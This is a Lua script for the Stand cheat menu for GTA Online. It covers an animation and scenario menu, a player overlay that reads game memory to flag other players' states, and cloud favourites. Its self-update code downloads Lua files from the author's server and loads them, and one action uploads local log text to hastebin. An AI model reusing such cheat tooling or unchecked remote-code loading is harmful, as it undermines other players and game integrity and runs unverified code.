					local getotr = memory.script_global(2689156 + (1 + (pid * 453)) + 209)
					local PlayerName = PLAYER.GET_PLAYER_NAME(pid)
					PlayerHandle = memory.alloc(13*4)
					NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, PlayerHandle, 13)
					
					if players.is_godmode(pid) then 
						tag = tag .. "[G]"
						color = god
					end
					if players.is_in_interior(pid) then
						tag = tag .. "[I]"
						color = interior
					end
					if memory.read_int(getotr) ==  1 then
						tag = tag .. "[O]"
						color = otr
					end
					if players.get_script_host() == pid then
						tag = tag .. "[SH]"
						color = host
					end
					if players.get_host() == pid then
						tag = tag .. "[H]"
						color = host
					end
					if PLAYER.IS_PLAYER_DEAD(pid) then
						tag = tag .. "[D]"
						color = dead
					end
					if players.is_marked_as_modder(pid) then
						tag = tag .. "[M]"
						color = modder
					end
					if NETWORK.NETWORK_IS_FRIEND(PlayerHandle) then
						tag = tag .. "[F]"
						color = friend
					end
					memory.free(PlayerHandle)

					directx.draw_text(posx, posy, PlayerName .. " " .. tag, ALIGN_TOP_LEFT, 0.4, color)
					posx = posx + 0.1
					if posx > 0.95 then
						posy = posy + 0.0175
						posx = 0.001
					end
				end
			end
		end
		util.yield()
	end
end)

]]

local SCRIPT_SOURCE = "REPO"
local SCRIPT_BRANCH = "release"
local BRANCH_LAST_COMMIT = "d26731ac7ca2bf1339315b3eb8d5f26b378691f3"
local SCRIPT_BRANCH_IDS = {"jackzscript","master","release"}
local SCRIPT_BRANCH_NAMES = {{"jackzscript"},{"dev"},{"release"}}


local SCRIPT = "actions"
VERSION = "1.10.10"
local ANIMATIONS_DATA_FILE = filesystem.resources_dir() .. "/jackz_actions/animations.txt"
local ANIMATIONS_DATA_FILE_VERSION = "1.0"
local SPECIAL_ANIMATIONS_DATA_FILE_VERSION = "1.0.0" -- target version of actions_data

sexscript = menu.list(funfun, "Animation Script", {}, "", function(); end)

-- TEMPLATE: release/log.lua --
Log = {}
if SCRIPT_DEBUG == nil then
    SCRIPT_DEBUG = false
end
function Log._log(prefix, ...)
    local mod = debug.getinfo(3, "n").name or debug.getinfo(4, "n").name or "_anon_func"
    local msg = ""
    for _, a in ipairs(...) do
        if a == nil then a = "<nil>" end
        if type(a) == "table" then a = dumpTable(a) end
        msg = msg .. tostring(a) .. "\t"
    end
    if prefix then prefix = "[" .. prefix .. "] "
    else prefix = "" end
    util.log(string.format("%s%s:%s/%s: %s", prefix, SCRIPT_NAME, SCRIPT_SOURCE or "DEV", mod, msg))
end
function Log.debug(...)
    if SCRIPT_DEBUG then
        local arg = {...}
        Log._log("debug", arg)
    end
end
function Log.debugTable(table)
    if SCRIPT_DEBUG then
        local mod = debug.getinfo(3, "n").name or debug.getinfo(4, "n").name or "_anon_func"
        util.log(string.format("%s:%s/%s: %s", SCRIPT_NAME, SCRIPT_SOURCE or "DEV", mod, dumpTable(table)))
    end
end
function Log.warn(...)
    local arg = {...}
    Log._log("Warn", arg)
end
function Log.error(...)
    local arg = {...}
    Log._log("Error", arg)
end
function Log.severe(...)
    local arg = {...}
    Log._log("Severe", arg)
    util.stop_script()
end
function Log.log(...)
    local arg = {...}
    Log._log(nil, arg)
end

function dumpTable(o)
    if type(o) == 'table' then
       local s = '{ '
       for k,v in pairs(o) do
          if type(k) ~= 'number' then k = '"'..k..'"' end
          s = s .. '['..k..'] = ' .. dumpTable(v) .. ','
       end
       return s .. '} '
    elseif type(o) == "string" then
        return '"' .. o .. "'"
    else
       return tostring(o)
    end
end
-- END TEMPLATE --
-- TEMPLATE: release/repo.lua --
function download_resources_update(filepath, destOverwritePath)
    local lockPath = filesystem.scripts_dir() .. "/lib/" .. filepath .. ".lock"
    if filesystem.exists(lockPath) then
        util.log(SCRIPT_NAME .. ": Skipping resource update \" .. lib .. \", found update lockfile")
    end
    local lock = io.open(lockPath, "w")
    if lock == nil then
        util.toast(SCRIPT_NAME .. ": Could not create lockfile, skipping update", TOAST_ALL)
        return
    end
    lock:close()
    async_http.init("jackz.me", "/stand/get-lua.php?script=resources/" .. filepath .. "&source=" .. SCRIPT_SOURCE .. "&branch=" .. (SCRIPT_BRANCH or "master"), function(result, res_headers, status_code)
        os.remove(lockPath)
        if status_code ~= 200 or result:startswith("<") then
            util.toast("Resource returned invalid response for \"" .. filepath .. "\"\nSee logs for details")
            util.log(string.format("%s: Resource \"%s\" returned: %s", SCRIPT_NAME, filepath, result))
            return
        end
        local file = io.open(filesystem.resources_dir() .. (destOverwritePath or filepath), "w")
        if file == nil then
            util.toast("Could not write resource file for: " .. filepath .. "\nSee logs for details")
            util.log(string.format("%s: Resource \"%s\" file could not be created.", SCRIPT_NAME, filepath))
            return
        end
        Log.log("Updated resource ", filepath, "for", SCRIPT_NAME, "to branch", SCRIPT_BRANCH or "master")
        file:write(result:gsub("\r", "") .. "\n")
        file:close()
        util.toast(SCRIPT .. ": Automatically updated resource '" .. filepath .. "'")
    end, function(e)
        os.remove(lockPath)
        util.toast(SCRIPT .. " cannot load: Library files are missing. (" .. filepath .. ")", 10)
        util.stop_script()
    end)
    async_http.dispatch()
end

-- END TEMPLATE --
-- TEMPLATE: release/common.lua --
-- People keep trying to run stuff on non-stand
if not filesystem.stand_dir then
    print("Unsupported. Only stand is supported")
    return
end
----------------------------------------------------------------
-- Version Check
function get_version_info(version)
    if not version then error("Missing version", 2) end
    local major, minor, patch = version:match("(%d+)%.(%d+)%.(%d+)")
    return {
        major = tonumber(major) or 0,
        minor = tonumber(minor) or 0,
        patch = tonumber(patch) or 0
    }
end
function compare_version(a, b)
    local av = get_version_info(a)
    local bv = get_version_info(b)
    if not av or not bv then error("Missing versions to compare") end
    if av.major > bv.major then return 1
    elseif av.major < bv.major then return -1
    elseif av.minor > bv.minor then return 1
    elseif av.minor < bv.minor then return -1
    elseif av.patch > bv.patch then return 1
    elseif av.patch < bv.patch then return -1
    else return 0 end
end
if SCRIPT_BRANCH and SCRIPT_BRANCH == "release" then
    local VERSION_FILE_PATH = filesystem.store_dir() .. "jackz_versions.txt"
    if not filesystem.exists(VERSION_FILE_PATH) then
        local versionFile = io.open(VERSION_FILE_PATH, "w")
        if versionFile then
            versionFile:close()
        end
    end
    local versionFile = io.open(VERSION_FILE_PATH, "r+")
    if versionFile then
        local versions = {}
        for line in versionFile:lines("l") do
            local script, version = line:match("(%g+): (%g+)")
            if script then
                versions[script] = version
            end
        end
        if versions[SCRIPT_NAME] == nil or compare_version(VERSION, versions[SCRIPT_NAME]) == 1 then
            if versions[SCRIPT_NAME] ~= nil then
                async_http.init("jackz.me", "/stand/changelog.php?raw=1&script=" .. SCRIPT_NAME .. "&since=" .. versions[SCRIPT_NAME] .. "&branch=" .. (SCRIPT_BRANCH or "master"), function(result)
                    util.toast("Changelog for " .. SCRIPT_NAME .. " version " .. VERSION .. ":\n" .. result)
                end, function() util.log(SCRIPT_NAME ..": Could not get changelog") end)
                async_http.dispatch()
            end
            versions[SCRIPT_NAME] = VERSION
            versionFile:seek("set", 0)
            versionFile:write("# DO NOT EDIT ! File is used for changelogs\n")
            for script, version in pairs(versions) do
                versionFile:write(script .. ": " .. version .. "\n")
            end
        end
        versionFile:close()
    else
        util.log(SCRIPT_NAME .. ": Failed to access to version file")
    end
end
-- END Version Check
------------------------------------------------------------------
function show_busyspinner(text)
    HUD.BEGIN_TEXT_COMMAND_BUSYSPINNER_ON("STRING")
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(text)
    HUD.END_TEXT_COMMAND_BUSYSPINNER_ON(2)
end

SCRIPT_META_LIST = menu.list(sexscript, "Script Meta")
menu.divider(SCRIPT_META_LIST, SCRIPT_NAME .. " V" .. VERSION)
if SCRIPT_SOURCE == "MANUAL" then
    menu.list_select(SCRIPT_META_LIST, "Release Channel", {SCRIPT_NAME.."channel"}, "Sets the release channel for updates for this script.\nChanging the channel from release may result in bugs.", SCRIPT_BRANCH_NAMES, 1, function(index, name)
        show_busyspinner("Downloading update...")
        download_script_update(SCRIPT_BRANCH_IDS[index], function()
            HUD.BUSYSPINNER_OFF()
            util.log(SCRIPT_NAME .. ": Released channel changed to " .. SCRIPT_BRANCH_IDS[index])
            util.toast("Release channel changed to " .. name .. " (" .. SCRIPT_BRANCH_IDS[index] .. ")\nReload to apply changes")
        end, function()
            util.toast("Failed to download latest version for release channel.")
        end)
    end)
else
    menu.readonly(SCRIPT_META_LIST, "Release Channel", "Use the manual version from https://jackz.me/stand/get-latest-zip to change the release channel.")
end
if _lang ~= nil then
    menu.hyperlink(SCRIPT_META_LIST, "Help Translate", "https://jackz.me/stand/translate/?script=" .. SCRIPT, "If you wish to help translate, this script has default translations fed via google translate, but you can edit them here:\nOnce you make changes, top right includes a save button to get a -CHANGES.json file, send that my way.")
    _lang.add_language_selector_to_menu(SCRIPT_META_LIST)
end
menu.readonly(SCRIPT_META_LIST, "Build Commit", BRANCH_LAST_COMMIT and BRANCH_LAST_COMMIT:sub(1,10) or "Dev Build")
menu.action(SCRIPT_META_LIST, "Upload Logs", {}, "Uploads the last ~20 lines of your stand log (%appdata%\\Stand\\Log.txt) to hastebin.com.\nHastebin posts expire in upto 7 days.\n\nUploaded log can be accessed from \"Open Uploaded Log\" button below once pressed", function()
    local logs = io.open(filesystem.stand_dir() .. "Log.txt", "r")
    if logs then
        show_busyspinner("Uploading logs....")
        async_http.init("hastebin.com", "/documents", function(body)
            HUD.BUSYSPINNER_OFF()
            local url = "https://hastebin.com/" .. body:sub(9, -3)
            util.toast("Uploaded: " .. url)
            menu.hyperlink(SCRIPT_META_LIST, "Open Uploaded Log", url)
        end, function()
            util.toast("Failed to submit logs, network error")
            HUD.BUSYSPINNER_OFF() 
        end)
        logs:seek("end", -3072)
        local content = logs:read("*a")
        async_http.set_post("text/plain",
            string.format("Script: %s\nSource: %s\nBranch: %s\nVersion: %s\nCommit: %s\n%s", SCRIPT_NAME, SCRIPT_SOURCE or "UNK", SCRIPT_BRANCH or "UNK", VERSION or "UNK", BRANCH_LAST_COMMIT or "DEV BUILD", content)
        )
        async_http.dispatch()
        logs:close()
    else
        util.toast("Could not read your stand log file")
    end
end)

SCRIPT_DEBUG = SCRIPT_SOURCE == nil

function try_require(name, isOptional)
    local status, data = pcall(require, name)
    if status then
        return data
    else
        if data then
            util.toast(name .. ": " .. data, TOAST_ALL)
        end
        if SCRIPT_SOURCE == "REPO" then
            if isOptional then
                Log.debug("Missing optional dependency: " .. name)
            else
                util.toast("Missing a required depencency (\"" .. name .. "\"). Please install this from the repo > dependencies list")
                Log.severe("Missing required dependency:", name)
            end
        elseif download_lib_update then
            local lockPath = download_lib_update(name, function()
                Log.log("Downloaded ", isOptional and "optional" or "required", "library:", name)
            end)
            while filesystem.exists(lockPath) do
                util.yield(500)
            end
            return require(name)
        end
        return nil
    end
end
-- END TEMPLATE --

if metaList then
    menu.divider(metaList, "-- Credits --")
    menu.hyperlink(metaList, "dpemotes", "https://github.com/andristum/dpemotes/", "For the special animations section, code was modified from repository")
end

-- Iterates in consistent order a Key/Value
function pairsByKeys(t, f)
    local a = {}
    for n in pairs(t) do
       table.insert(a, n)
    end
    table.sort(a, f)
    local i = 0 -- iterator variable
    local iter = function()
        -- iterator function
        i = i + 1
        if a[i] == nil then
            return nil
        else
            return a[i], t[a[i]]
        end
    end
    return iter
 end
local status = pcall(require, 'resources/jackz_actions/actions_data')
if not status then
    util.toast("Failed to load resource file: jackz_actions/actions_data.lua")
    util.stop_script()
end
if ANIMATION_DATA_VERSION ~= SPECIAL_ANIMATIONS_DATA_FILE_VERSION then
    if SCRIPT_SOURCE == "MANUAL" then
        download_resources_update("jackz_actions/actions_data.min.lua", "jackz_actions/actions_data.lua")
        util.toast("Restart script to use updated resource file")
    else
        util.toast("jackz_actions: Warn: Outdated or missing actions_data. Version: " .. (ANIMATION_DATA_VERSION or "<missing>"))
        util.stop_script()
    end
end

-- Messy Globals
local scenarioCount = 0

local clearActionImmediately = true
local favorites = {}
local favoritesActions = {}
local recents = {}
local animFlags = AnimationFlags.ANIM_FLAG_REPEAT | AnimationFlags.ANIM_FLAG_ENABLE_PLAYER_CONTROL
local allowControl = true
local affectType = 0
-----------------------
-- SCENARIOS
----------------------

menu.action(sexscript, "Stop All Actions", {"stopself"}, "Stops the current scenario or animation", function(v)
    clear_anim_props()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    if clearActionImmediately then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    else
        TASK.CLEAR_PED_TASKS(ped)
    end
    if affectType > 0 then
        local peds = entities.get_all_peds_as_handles()
        for _, npc in ipairs(peds) do
            if not PED.IS_PED_A_PLAYER(npc) and not PED.IS_PED_IN_ANY_VEHICLE(npc, true) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(npc)
                if clearActionImmediately then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(npc)
                else
                    TASK.CLEAR_PED_TASKS(npc)
                end
            end
        end
    end
end)
menu.toggle(sexscript, "Clear Action Immediately", {"clearimmediately"}, "If enabled, will immediately stop the animation / scenario that is playing when activating a new one. If false, you will transition smoothly to the next action.", function(on)
    lclearActionImmediately = on
end, clearActionImmediately)
menu.list_select(sexscript, "Action Targets", {"actiontarget"}, "The entities that will play this action.\n0 = Only yourself\n1 = Only NPCs\n2 = Both you and NPCS", { { "Only yourself" }, { "Only NPCs" }, {"Both"} }, 1, function(index)
    affectType = index - 1
end)
function onControllablePress(value)
    if value then
        animFlags = AnimationFlags.ANIM_FLAG_REPEAT | AnimationFlags.ANIM_FLAG_ENABLE_PLAYER_CONTROL
    else
        animFlags = AnimationFlags.ANIM_FLAG_REPEAT
    end
end
function generateAnimationAction(key, data)
    return function()
        util.toast("Playing anim: " .. data[3] or key)
        util.log(string.format("dict=%s anim=%s name=%s", data[1], data[2], data[3]))
        play_animation(data[1], data[2], false, data)
    end
end

menu.divider(sexscript, "Stuff")
local specialAnimationsMenu = menu.list(sexscript, "Special Animations", {}, "Special animations that can use props")
menu.toggle(specialAnimationsMenu, "Controllable", {"animationcontrollable"}, "Should the animation allow player control?", onControllablePress, allowControl)
local animationsMenu = menu.list(sexscript, "Animations", {}, "List of animations you can play")
menu.toggle(animationsMenu, "Controllable", {"animationcontrollable"}, "Should the animation allow player control?", onControllablePress, allowControl)


for category, rows in pairsByKeys(SPECIAL_ANIMATIONS) do
    local catmenu = menu.list(specialAnimationsMenu, category, {})
    for key, data in pairsByKeys(rows) do
        menu.action(
            catmenu,
            data[3] or key,
            {"playanim"..key},
            string.format("%s %s\nPlay this animation\nAnimation Id: %s", data[1], data[2], key),
            generateAnimationAction(key, data)
        )
    end
end
-----------------------
-- ANIMATIONS
----------------------
local animLoaded = false
local animAttachments = {}
function clear_anim_props()
    for ent, shouldDelete in pairs(animAttachments) do
        if shouldDelete then
            entities.delete(ent)
        else
            ENTITY.DETACH_ENTITY(ent, false)
        end
    end
end
function delete_anim_props()
    for ent, _ in pairs(animAttachments) do
        entities.delete(ent)
    end
end

local animMenuData = {}
local resultMenus = {}
local cloudFavoritesMenu = menu.list(animationsMenu, "Cloud Favorites", {}, "View categorized saved favorites from other users, or store your own.")
local favoritesMenu = menu.list(animationsMenu, "Favorites", {}, "List of all your favorited animations. Hold SHIFT to add or remove from favorites.")
local cloudFavoritesUploadMenu = menu.list(cloudFavoritesMenu, "Upload", {}, "Add your own cloud animation favorites. BETA.")
    local cloudUploadFromFavorites = menu.list(cloudFavoritesUploadMenu, "From Favorites", {}, "Browse your favorite played animations to upload them", function() populate_cloud_list(true) end)
    local cloudUploadFromRecent = menu.list(cloudFavoritesUploadMenu, "From Recent", {}, "Browse your recently played animations to upload them",  function() populate_cloud_list(false) end)
local cloudFavoritesBrowseMenu = menu.list(cloudFavoritesMenu, "Browse", {}, "Browse all uploaded cloud animation favorites")

local cloudUsers = {} -- Record<user, { menu, categories = Record<dictionary, { menu, animations = {} }>}
local cloud_loading = false
function cloudvehicle_fetch_error(code)
    return function()
        cloud_loading = false
        util.toast("An error occurred fetching cloud data. Code: " .. code, TOAST_ALL)
        HUD.BUSYSPINNER_OFF()
    end
end
local cloud_list = {}
function upload_animation(group, animation, alias)
    show_busyspinner("Uploading animation")
    async_http.init('jackz.me',
        string.format(
            '/stand/cloud/actions/manage?scname=%s&hash=%d&alias=%s&dict=%s&anim=%s',
            SOCIALCLUB._SC_GET_NICKNAME(),
            menu.get_activation_key_hash(),
            alias or '',
            group,
            animation
        ),
        function(body)
            if body == "OK" then
                util.toast("Upload successful for " .. group .. "/" .. animation)
            elseif body == "Conflict" then
                util.toast("Animation already uploaded")
            else
                util.toast("Upload failed for " .. group .. "/" .. animation .. ": " .. body)
            end
            HUD.BUSYSPINNER_OFF()
        end
    )
    async_http.set_post('text/plain', '')
    async_http.dispatch()
end
function populate_cloud_list(useFavorites)
    local listMenu = useFavorites and cloudUploadFromFavorites or cloudUploadFromRecent
    local tuple = useFavorites and favorites or recents
    for _, m in ipairs(cloud_list) do
        menu.delete(m)
    end
    cloud_list = {}
    for _, favorite in ipairs(tuple) do
        local name = favorite[2]
        -- if favorite[3] then
        --     name = favorite[3] .. " (" .. favorite[2] .. ")"
        -- end
        local action = menu.action(listMenu, name, {}, "Upload the " .. favorite[2] .. " from group " .. favorite[1] .. " to the cloud", function(v)
            upload_animation(favorite[1], favorite[2], nil)
        end)
        table.insert(cloud_list, action)
    end
end
function populate_user_dict(user, dictionary)
    show_busyspinner("Fetching animations for " .. dictionary)
    while cloud_loading do
        util.yield()
    end
    cloud_loading = true
    async_http.init('jackz.me', '/stand/cloud/actions/list?method=actions&scname=' .. user .. "&dict=" .. dictionary, function(body)
        cloud_loading = false
        if body:sub(1, 1) == "<" then
            util.toast("Ratelimited, try again in a few seconds.")
            menu.divider(cloudUsers[user].categories[dictionary].menu, "Ratelimited, try again in a few seconds")
            return
        end
        for _, animation in ipairs(cloudUsers[user].categories[dictionary].animations) do
            pcall(menu.delete, animation)
        end
        cloudUsers[user].categories[dictionary].animations = {}
        local count = 0
        for animation in string.gmatch(body, "[^\r\n]+") do
            count = count + 1
            local action = menu.action(cloudUsers[user].categories[dictionary].menu, animation, {}, dictionary .. " " .. animation, function(_)
                play_animation(dictionary, animation)
            end)
            table.insert(cloudUsers[user].categories[dictionary].animations, action)
        end
        menu.set_menu_name(cloudUsers[user].categories[dictionary].menu, dictionary .. " (" .. count .. ")")
        HUD.BUSYSPINNER_OFF()
    end, cloudvehicle_fetch_error("FETCH_USER_ANIMS"))
    async_http.dispatch()
end
menu.on_focus(cloudFavoritesBrowseMenu, function()
    show_busyspinner("Fetching users")
    while cloud_loading do
        util.yield()
    end
    cloud_loading = true
    async_http.init('jackz.me', '/stand/cloud/actions/list?method=users', function(body)
        cloud_loading = false
        if body:sub(1, 1) == "<" then
            cloudvehicle_fetch_error("RATELIMITED")
            return
        end
        for user, udata in pairs(cloudUsers) do
            pcall(menu.delete, udata.menu)
            for dictionary, cdata in pairs(udata.categories) do
                pcall(menu.delete, cdata.menu)
                for i, animation in ipairs(cdata.animations) do
                    pcall(menu.delete, animation)
                    cdata.animations[i] = nil
                end
                udata.categories[dictionary] = nil
            end
            cloudUsers[user].menu = nil
        end
        for user in string.gmatch(body, "[^\r\n]+") do
            local userMenu = menu.list(cloudFavoritesBrowseMenu, user, {}, "All action categories favorited by " .. user)
            cloudUsers[user] = {
                menu = userMenu,
                categories = {}
            }
            -- TODO: Move from on_focus to on click
            menu.on_focus(userMenu, function(_)
                show_busyspinner("Fetching dictionaries for " .. user)
                while cloud_loading do
                    util.yield()
                end
                cloud_loading = true
                async_http.init('jackz.me', '/stand/cloud/actions/list?method=dicts&scname=' .. user, function(body)
                    cloud_loading = false
                    if body:sub(1, 1) == "<" then
                        cloudvehicle_fetch_error("RATELIMITED")
                        return
                    end
                    for dictionary, cdata in pairs(cloudUsers[user].categories) do
                        pcall(menu.delete, cdata.menu)
                        for animation in ipairs(cdata.animations) do
                            pcall(menu.delete, animation)
                        end
                    end
                    cloudUsers[user].categories = {}
                    local count = 0
                    for dictionary in string.gmatch(body, "[^\r\n]+") do
                        count = count + 1
                        local dictMenu = menu.list(userMenu, dictionary, {}, "All actions in " .. dictionary .. " favorited by " .. user, function() populate_user_dict(user, dictionary) end)
                        cloudUsers[user].categories[dictionary] = {
                            menu = dictMenu,
                            animations = {}
                        }
                    end
                    menu.set_menu_name(userMenu, user .. " (" .. count .. ")")
                    HUD.BUSYSPINNER_OFF()
                end, cloudvehicle_fetch_error("FETCH_USER_CATEGORIES"))
                async_http.dispatch()
            end)
        end
        HUD.BUSYSPINNER_OFF()
    end, cloudvehicle_fetch_error("FETCH_USERS"))
    async_http.dispatch()
end)
local recentsMenu = menu.list(animationsMenu, "Recents", {}, "List of all your recently played animations")
menu.divider(animationsMenu, "Raw Animations")
local searchMenu = menu.list(animationsMenu, "Search", {}, "Search for animation groups")
menu.action(searchMenu, "Search Animation Groups", {"searchanim"}, "Searches all animation groups for the inputted text", function()
    menu.show_command_box("searchanim ")
end, function(args)
    -- Delete existing results
    for _, m in ipairs(resultMenus) do
        pcall(menu.delete, m)
    end
    resultMenus = {}
    -- Find all possible groups
    local results = {}
    -- loop ANIMATIONS by heading then subheading then insert based on result
    if not filesystem.exists(ANIMATIONS_DATA_FILE) then
        download_animation_data()
    end
    -- Parse the file
    local isHeaderRead = false
    -- Possibly recurse down categories splitting on _ and @
    for line in io.lines(ANIMATIONS_DATA_FILE) do
        if isHeaderRead then
            
            local i, j = line:find(args)
            if i then
                chunks = {} -- [ category, anim ]
                for substring in string.gmatch(line, "%S+") do
                    table.insert(chunks, substring)
                end
                -- Add the distance:
                chunks[3] = j - i
                table.insert(results, chunks)
            end
            -- TODO: Add back organization to list
        else
            local version = line:sub(2)
            if version ~= ANIMATIONS_DATA_FILE_VERSION then
                util.toast("Animation data out of date, updating...")
                download_animation_data()
            end
            isHeaderRead = true
        end
    end
    -- Sort by distance
    table.sort(results, function(a, b) return a[3] > b[3] end)
    -- Messy, but no way to call a list group, so recreate all animations in a sublist:
    for i = 1, 201 do
        if results[i] then
            -- local m = menu.list(searchMenu, group, {}, "All animations for " .. group)
           local m = menu.action(searchMenu, results[i][2], {"animate" .. results[i][1] .. " " .. results[i][2]}, "Plays the " .. results[i][2] .. " animation from group " .. results[i][1], function(v)
                play_animation(results[i][1], results[i][2], false)
            end)
            table.insert(resultMenus, m)
        end
    end
end)
local browseMenu = menu.list(animationsMenu, "Browse Animations", {}, "WARNING: Will cause a freeze when exiting, stand does not like unloading 15,000 animations. Use search if your pc cannot handle.", function() setup_animation_list() end)
menu.on_focus(browseMenu, function()
    if animLoaded then
        util.toast("WARN: Unloading animation browse list, prepare for lag.")
        util.yield(100)
        destroy_animations_data()
    end
end)
show_busyspinner("Loading Menus...")


local scenariosMenu = menu.list(sexscript, "Scenarios", {}, "List of scenarios you can play\nSome scenarios only work on certain genders, example AA Coffee only works on male peds.")
for group, scenarios in pairs(SCENARIOS) do
    local submenu = menu.list(scenariosMenu, group, {}, "All " .. group .. " scenarios")
    for _, scenario in ipairs(scenarios) do
        scenarioCount = scenarioCount + 1
        menu.action(submenu, scenario[2], {"scenario"}, "Plays the " .. scenario[2] .. " scenario", function(v)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
            
            -- Play scenario on all npcs if enabled:
            if affectType > 0 then
                local peds = entities.get_all_peds_as_handles()
                for _, npc in ipairs(peds) do
                    if not PED.IS_PED_A_PLAYER(npc) and not PED.IS_PED_IN_ANY_VEHICLE(npc, true) then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(npc)
                        if clearActionImmediately then
                            TASK.CLEAR_PED_TASKS_IMMEDIATELY(npc)
                        end
                        TASK.TASK_START_SCENARIO_IN_PLACE(npc, scenario[1], 0, true);
                    end
                end
            end
            -- Play scenario on self if enabled:
            if affectType == 0 or affectType == 2 then
                if clearActionImmediately then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                end
                TASK.TASK_START_SCENARIO_IN_PLACE(ped, scenario[1], 0, true);
            end
        end)
    end
end
HUD.BUSYSPINNER_OFF()

local selfSpeechPed = {
    entity = 0,
    lastUsed = os.millis(),
    model = util.joaat("a_f_m_bevhills_01")
}

-----------------------
-- Animation Functions
----------------------
-- Maybe smart deletion but eh
function populate_favorites()
    for _, action in ipairs(favoritesActions) do
        menu.delete(action)
    end
    favoritesActions = {}
    for _, favorite in ipairs(favorites) do
        local name = favorite[2]
        if favorite[3] then
            name = favorite[3] .. " (" .. favorite[2] .. ")"
        end
        local a
        a = menu.action(favoritesMenu, name, {}, "Plays " .. favorite[2] .. " from group " .. favorite[1], function(v)
            if PAD.IS_CONTROL_PRESSED(2, 209) then
                menu.show_warning(a, 2, "Are you sure you want to remove this animation from your favorites", function()
                    play_animation(favorite[1], favorite[2], false, nil, true)
                end)
            else
                play_animation(favorite[1], favorite[2], false)
            end
        end)
        table.insert(favoritesActions, a)
    end
end

function is_anim_in_recent(group, anim)
    for _, recent in ipairs(recents) do
        if recent[1] == group and recent[2] == anim then
            return true
        end
    end
    return false
end

function add_anim_to_recent(group, anim)
    if #recents >= 20 then
        menu.delete(recents[1][3])
        table.remove(recents, 1)
    end
    local action = menu.action(recentsMenu, anim, {"animate" .. group .. " " .. anim}, "Plays the " .. anim .. " animation from group " .. group, function(v)
        play_animation(group, anim, true)
    end)
    table.insert(recents, { group, anim, action })
end
function download_animation_data()
    local loading = true
    show_busyspinner("Downloading animation data")
    async_http.init("jackz.me", "/stand/resources/jackz_actions/animations.txt", function(result)
        local file = io.open(ANIMATIONS_DATA_FILE, "w")
        file:write(result:gsub("\r", ""))
        file:close()
        util.log(SCRIPT .. ": Downloaded resource file successfully")
        HUD.BUSYSPINNER_OFF()
        loading = false
    end, function()
        util.toast(SCRIPT .. ": Failed to automatically download animations data file. Please download latest file manually.")
        util.stop_script()
        loading = false
    end)
    async_http.dispatch()
    while loading do
        util.yield()
    end
    HUD.BUSYSPINNER_OFF()
end
function destroy_animations_data()
    for category, data in pairs(animMenuData) do
        pcall(menu.delete, data.list)
    end
    animMenuData = {}
    animLoaded = false
    menu.collect_garbage()
end
function setup_category_animations(category)
    animMenuData[category].menus = {}
    for _, animation in ipairs(animMenuData[category].animations) do
        local action = menu.action(animMenuData[category].list, animation, {"animate" .. category .. " " .. animation}, "Plays the " .. animation .. " animation from group " .. category, function(v)
            play_animation(category, animation, false)
        end)
        table.insert(animMenuData[category].menus, action)
    end
end
function setup_animation_list()
    if animLoaded then
        return
    end
    -- Download animation file if does not exist
    if not filesystem.exists(ANIMATIONS_DATA_FILE) then
        download_animation_data()
    end
    -- Parse the file
    local isHeaderRead = false
    -- Possibly recurse down categories splitting on _ and @
    for line in io.lines(ANIMATIONS_DATA_FILE) do
        if isHeaderRead then
            chunks = {} -- [ category, anim ]
            for substring in string.gmatch(line, "%S+") do
                table.insert(chunks, substring)
            end
            if #chunks == 2 then
                local category = chunks[1]
                if animMenuData[category] == nil then
                    animMenuData[category] = {
                        animations = {},
                    }
                    local list = menu.list(browseMenu, category, {}, "", function() setup_category_animations(category) end
                    , function()
                        if animMenuData[category].menus then
                            for _, m in ipairs(animMenuData[category].menus) do
                                pcall(menu.delete, m)
                            end
                            animMenuData[category].menus = nil
                        end
                    end)
                    animMenuData[category].list = list
                end
                table.insert(animMenuData[chunks[1]].animations, chunks[2])
            end
        else
            local version = line:sub(2)
            if version ~= ANIMATIONS_DATA_FILE_VERSION then
                util.toast("Animation data out of date, updating...")
                download_animation_data()
            end
            isHeaderRead = true
        end
    end
    animLoaded = true
end

function play_animation(group, anim, doNotAddRecent, data, remove)
    local flags = animFlags -- Keep legacy animation flags
    local duration = -1
    local props
    if data ~= nil then
        flags = AnimationFlags.ANIM_FLAG_NORMAL
        if data.AnimationOptions ~= nil then
            if data.AnimationOptions.Loop then
                flags = flags | AnimationFlags.ANIM_FLAG_REPEAT
            end
            if data.AnimationOptions.Controllable then
                flags = flags | AnimationFlags.ANIM_FLAG_ENABLE_PLAYER_CONTROL | AnimationFlags.ANIM_FLAG_UPPERBODY
            end
            if data.AnimationOptions.EmoteDuration then
                duration = data.AnimationOptions.EmoteDuration
            end
        end
        if data.AnimationOptions and data.AnimationOptions.Props then
            props = data.AnimationOptions.Props
        end
    end
    if remove then
        for i, favorite in ipairs(favorites) do
            if favorite[1] == group and favorite[2] == anim then
                table.remove(favorites, i)
                populate_favorites()
                save_favorites()
                util.toast("Removed " .. group .. "\n" .. anim .. " from favorites")
                return
            end
        end
        table.insert(favorites, { group, anim })
        populate_favorites()
        save_favorites()
        util.toast("Added " .. group .. "\n" .. anim .. " to favorites")
    else
        clear_anim_props()
        STREAMING.REQUEST_ANIM_DICT(group)
        while not STREAMING.HAS_ANIM_DICT_LOADED(group) do
            util.yield(100)
        end
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        

        if not is_anim_in_recent(group, anim) and not doNotAddRecent then
            add_anim_to_recent(group, anim)
        end

        -- Play animation on all npcs if enabled:
        if affectType > 0 then
            local peds = entities.get_all_peds_as_handles()
            for _, npc in ipairs(peds) do
                if not PED.IS_PED_A_PLAYER(npc) and not PED.IS_PED_IN_ANY_VEHICLE(npc, true) then
                    _play_animation(npc, group, anim, flags, duration, props)
                end
            end
        end
        -- Play animation on self if enabled:
        if affectType == 0 or affectType == 2 then
            _play_animation(ped, group, anim, flags, duration, props)
        end
        STREAMING.REMOVE_ANIM_DICT(group)
    end
end

function _play_animation(ped, group, animation, flags, duration, props)
    if clearActionImmediately then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end
    if props ~= nil then
